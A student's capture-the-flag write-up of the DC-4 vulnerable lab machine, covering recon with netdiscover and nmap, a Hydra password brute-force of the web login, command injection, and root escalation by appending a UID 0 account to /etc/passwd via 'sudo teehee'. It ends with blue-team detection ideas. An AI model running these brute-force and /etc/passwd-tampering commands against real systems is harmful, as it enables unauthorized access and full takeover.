DC-4 is a deliberately vulnerable virtual machine made for cybersecurity
practice.

Think of the machine as a house:

# 2. Network Discovery

The first thing we needed to know was:

> "Is there a vulnerable machine on my lab network, and what is its IP
> address?"

We used `netdiscover`.

``` bash
sudo netdiscover
```

### What is `sudo`?

`sudo` means:

> Run this command with elevated privileges.

Some network-discovery operations require additional permissions.

### What is `netdiscover`?

`netdiscover` looks around the local network and identifies devices.

It uses ARP (Address Resolution Protocol).

A simple way to imagine ARP:

> "Who has this IP address? Tell me your MAC address."

We found the DC-4 machine:

``` text
192.168.29.175
```

The MAC address was:

``` text
08:00:27:a7:7d:8d
```

The VirtualBox-style MAC address also helped confirm that this was a
virtual machine.

### Important lesson

Before attacking a machine, we need to know where it is.

This is called **reconnaissance** or **enumeration**.

------------------------------------------------------------------------

# 3. Nmap --- Finding Open Doors

Once we knew the IP address, we wanted to know what services were
available.

We ran:

``` bash
nmap -A -sV 192.168.29.175
```

### What does Nmap do?

Nmap is a network scanning tool.

Imagine a building with 65,535 possible doors.

Nmap checks the doors and asks:

> "Is anything listening here?"

Each door corresponds to a TCP/UDP port.

Our important result was:

``` text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6
80/tcp open  http    nginx 1.15.10
```

So two important services were available:

### Port 22 --- SSH

SSH allows remote command-line access.

### Port 80 --- HTTP

HTTP is used by websites.

The web server was:

``` text
nginx 1.15.10
```

The page title was:

``` text
System Tools
```

### Nmap options

`-sV`:

> Try to determine the version of services.

`-A`:

> Enable several advanced detection features, including service/version
> detection, OS detection and scripts.

### Our first major clue

The machine had:

``` text
22 -> SSH
80 -> Web
```

The web service became our initial entry point.

# 8. Burp Suite

We used **Burp Suite** to see and modify HTTP requests.

### What is Burp Suite?

Burp is a web application security testing tool.

Think of it as a checkpoint between:

``` text
Browser <----> Website
```

Normally:

``` text
Browser -----------------> Website
```

With Burp:

``` text
Browser ---> Burp ---> Website
```

Burp lets us stop the request and inspect or modify it before sending
it.

------------------------------------------------------------------------

# 9. Capturing the Login Request

We intercepted a login attempt.

The request looked roughly like:

``` text
POST /login.php
```

with:

``` text
username=test&password=test
```

We also tested:

``` text
admin:test
```

The server returned the same type of failure response.

This didn't give us useful username enumeration.

### Important lesson

Not every test produces a vulnerability.

We learned that the login page accepted POST requests, but our simple
attempts did not reveal the password.

------------------------------------------------------------------------

# 10. Where Did the Username "admin" Come From?

This was one of the questions we specifically investigated.

The username `admin` was not discovered through successful enumeration.

It was a reasonable administrative username to test because the page was
an administrative system.

This is an important distinction:

``` text
Enumeration -> discovered fact
Guessing/common username -> hypothesis
```

We then tested the hypothesis using a password attack against the lab.

------------------------------------------------------------------------

# 11. Hydra --- Finding the Web Password

We used Hydra against the login form:

``` bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.29.175 http-post-form "/login.php:username=admin&password=^PASS^:S=command"
```

### What is Hydra?

Hydra is a password auditing/brute-force tool.

It repeatedly tries passwords against a service.

In our lab:

``` text
Username = admin
Password = many candidates
```

### Breaking down the command

``` text
hydra
```

Starts Hydra.

``` text
-l admin
```

Use the username:

``` text
admin
```

``` text
-P /usr/share/wordlists/rockyou.txt
```

Use the password wordlist.

``` text
192.168.29.175
```

Target machine.

``` text
http-post-form
```

The target uses an HTTP POST login form.

``` text
/login.php
```

Login endpoint.

``` text
username=admin&password=^PASS^
```

Hydra keeps the username as `admin` and replaces:

``` text
^PASS^
```

with each password candidate.

``` text
:S=command
```

This tells Hydra what successful authentication response to look for.

### Result

Hydra found:

``` text
login: admin
password: happy
```

So we had:

``` text
admin : happy
```

# 13. Discovering Command Injection

We intercepted the request to `command.php` using Burp.

The application used a parameter named:

``` text
radio
```

The normal values included commands such as:

``` text
ls -l
du -h
df -h
```

The important security question became:

> Is the server actually executing the value supplied by this parameter?

We tested command manipulation through Burp.

This eventually allowed us to execute commands that were not part of the
original intended choices.

That is **command injection**.

### What is command injection?

Imagine a website is supposed to run:

``` bash
ls -l
```

but instead of safely choosing a predefined command, it takes
user-controlled input and sends it to the operating system.

If an attacker can change that input, they may be able to make the
server execute another command.

The important concept is:

``` text
User input
    ↓
Web application
    ↓
Operating system command
```

If user input reaches the shell unsafely, command injection may occur.

------------------------------------------------------------------------

# 25. Understanding NOPASSWD

Normally, sudo may ask a user for their password.

`NOPASSWD` means:

> This particular command can be executed through sudo without asking
> for a password.

So Charles could run:

``` bash
sudo /usr/bin/teehee
```

and the program would execute with root privileges.

------------------------------------------------------------------------

# 26. Understanding teehee

We investigated the binary.

First:

``` bash
ls -l /usr/bin/teehee
```

It showed:

``` text
-rwxr-xr-x 1 root root ...
```

Then:

``` bash
/usr/bin/teehee --help
```

The help showed:

``` text
Copy standard input to each FILE, and also to standard output.
```

and, most importantly:

``` text
-a, --append
    append to the given FILEs, do not overwrite
```

So `teehee` behaves like the Linux `tee` utility.

### Simple example

Normally:

``` bash
echo "hello" | tee test.txt
```

takes:

``` text
hello
```

and writes it to:

``` text
test.txt
```

With:

``` bash
tee -a file
```

it appends instead of overwriting.

### Why was this dangerous?

Charles was allowed to execute `teehee` as root.

Therefore:

``` text
Charles
   |
   v
sudo teehee
   |
   v
teehee runs as root
   |
   v
Can write to root-owned files
```

This gave us a path to modify `/etc/passwd`.

------------------------------------------------------------------------

# 27. Testing the Sudo Permission

We ran:

``` bash
sudo /usr/bin/teehee
```

The program waited for input.

We interrupted it with:

``` text
Ctrl+C
```

This confirmed that the sudo rule was usable.

We then investigated the supported options instead of blindly modifying
a system file.

# 28. Understanding OpenSSL

Before using OpenSSL, we asked what it was actually doing.

OpenSSL is a security/cryptography toolkit.

It can be used for things such as:

-   Password hashing
-   Encryption
-   Certificates
-   TLS
-   Cryptographic keys
-   Digital signatures

In this lab, we only needed it to generate a password hash.

------------------------------------------------------------------------

# 30. Understanding /etc/passwd

Linux stores local user account information in:

``` text
/etc/passwd
```

A simplified entry looks like:

``` text
username:password:UID:GID:GECOS:home:shell
```

For example:

``` text
alice:x:1001:1001:Alice:/home/alice:/bin/bash
```

The most important field for our privilege escalation was the UID.

### UID 0

Linux identifies the root identity using:

``` text
UID = 0
```

Normally:

``` text
root:x:0:0:...
```

Therefore, creating another account with:

``` text
UID = 0
```

makes that account effectively root.

This is why our planned entry used:

``` text
0:0
```

for UID and GID.

------------------------------------------------------------------------

# 31. Creating the Root-Equivalent Account

We prepared this entry:

``` text
dc4root:GI8BDw2AnbJf2:0:0:DC4 Root:/root:/bin/bash
```

Breaking it down:

``` text
dc4root
```

Username.

``` text
GI8BDw2AnbJf2
```

Password hash.

``` text
0
```

UID --- root identity.

``` text
0
```

GID --- root group.

``` text
DC4 Root
```

Account description.

``` text
/root
```

Home directory.

``` text
/bin/bash
```

Login shell.

------------------------------------------------------------------------

# 32. Using teehee to Append the Account

We used:

``` bash
echo 'dc4root:GI8BDw2AnbJf2:0:0:DC4 Root:/root:/bin/bash' | sudo /usr/bin/teehee -a /etc/passwd
```

### What happened?

First:

``` bash
echo '...'
```

created the line.

Then:

``` text
|
```

(the pipe)

sent the line into `teehee`.

Then:

``` bash
sudo /usr/bin/teehee
```

ran `teehee` as root.

Finally:

``` text
-a /etc/passwd
```

told it to append the line to `/etc/passwd`.

We specifically used `-a` because we wanted to **append**, not overwrite
the existing password database.

------------------------------------------------------------------------

# 33. Verifying the Modification

``` bash
tail -n 3 /etc/passwd
```

The result included:

``` text

```

This confirmed that our account had been added.

# 39. What I Learned From DC-4

This machine taught me that exploitation is usually a chain of small
discoveries rather than one magic command.

The important lessons I learned were:

### Reconnaissance

I learned how to discover a target and identify its IP address using:

``` bash
sudo netdiscover
```

### Enumeration

I learned to use:

``` bash
nmap
gobuster
curl
```

to discover services, files, directories and application behavior.

### Web Testing

I learned how Burp Suite can intercept HTTP requests and allow me to
inspect and modify parameters.

### Authentication Attacks

I learned how Hydra can test credentials against:

-   HTTP POST forms
-   SSH

### Command Injection

I learned why passing user-controlled input into operating-system
commands can be dangerous.

### Credential Discovery

I learned that credentials can be exposed through:

-   Backup files
-   Mailboxes
-   Configuration files
-   Other users' mistakes

### Linux Enumeration

I learned the importance of:

``` bash
whoami
pwd
uname -a
sudo -l
cat /etc/passwd
find
```

### Privilege Escalation

I learned that:

``` bash
sudo -l
```

can reveal powerful commands available to a compromised user.

### SUID

I learned that seeing an `s` permission does not automatically mean a
file provides root access. The file owner and execution context matter.

### UID 0

I learned that Linux identifies the root identity by:

``` text
UID 0
```

rather than simply by the username `root`.

### OpenSSL

I learned that OpenSSL can generate password hashes and that the exact
supported options depend on the installed version.

### teehee

I learned why allowing a user to run a file-writing utility as root can
be extremely dangerous.

# 40. SOC / Blue-Team Perspective

Although DC-4 is an offensive lab, there are many defensive lessons.

A SOC analyst could look for indicators such as:

-   Repeated failed authentication attempts
-   Successful authentication after many failures
-   Hydra-like password spraying/brute-force patterns
-   Suspicious web requests
-   Command injection attempts
-   Web server processes spawning shells or unexpected commands
-   Access to sensitive files such as `/etc/passwd`
-   Users reading other users' mailboxes
-   `su` activity between accounts
-   Suspicious `sudo` execution
-   Modification of `/etc/passwd`
-   Creation of unexpected UID 0 accounts
-   A non-standard account appearing with UID 0
-   Access to `/root`
-   Unexpected command execution from a web application

One particularly useful detection idea is:

``` text
/etc/passwd modified
       +
new account with UID 0
       =
HIGHLY SUSPICIOUS
```

# 41. Final Takeaway

The most important thing I learned from DC-4 is that the final root
shell was not obtained from one exploit.

It was a chain:

``` text
Discovery
   ↓
Enumeration
   ↓
Web authentication
   ↓
Credential discovery
   ↓
SSH access
   ↓
User-to-user movement
   ↓
Sudo enumeration
   ↓
Abusable root command
   ↓
/etc/passwd modification
   ↓
UID 0
   ↓
Root
```

The biggest lesson is:

> **Always enumerate carefully after every level of access.**

Getting `jim` did not mean the machine was finished.

Getting `charles` did not mean the machine was finished.

Each new account gave us a new perspective and new permissions to
investigate.

That mindset---**enumerate, understand, verify, then act**---is one of
the most important habits I want to carry into cybersecurity and SOC
work.
